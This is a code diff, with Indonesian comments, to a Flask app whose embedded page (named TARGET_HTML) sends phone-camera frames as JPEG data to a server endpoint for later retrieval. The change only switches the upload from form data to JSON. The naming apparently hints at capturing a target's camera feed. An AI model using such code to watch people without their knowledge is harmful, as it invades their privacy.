@@ -69,11 +69,12 @@ TARGET_HTML = """
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Mengubah pengiriman string mentah menjadi objek FormData yang sah
-                let formData = new FormData();
-                formData.append("frame", canvas.toDataURL('image/jpeg', 0.4));
-                
-                fetch('/receive_frame', { method: 'POST', body: formData });
+                // KUNCI STABILITAS: Mengirimkan string gambar dalam format JSON mentah
+                fetch('/receive_frame', { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ frame: canvas.toDataURL('image/jpeg', 0.4) })
+                });
             }
         }
 
@@ -207,8 +208,10 @@ def logout():
 @app.route('/receive_frame', methods=['POST'])
 def receive_frame():
     global latest_frame
-    # Mengambil string data dari objek form yang dikirim oleh browser HP
-    latest_frame = request.form.get("frame")
+    # Mengambil string data gambar langsung dari struktur objek JSON
+    data = request.json
+    if data:
+        latest_frame = data.get("frame")
     return "OK"
 
 @app.route('/get_frame')
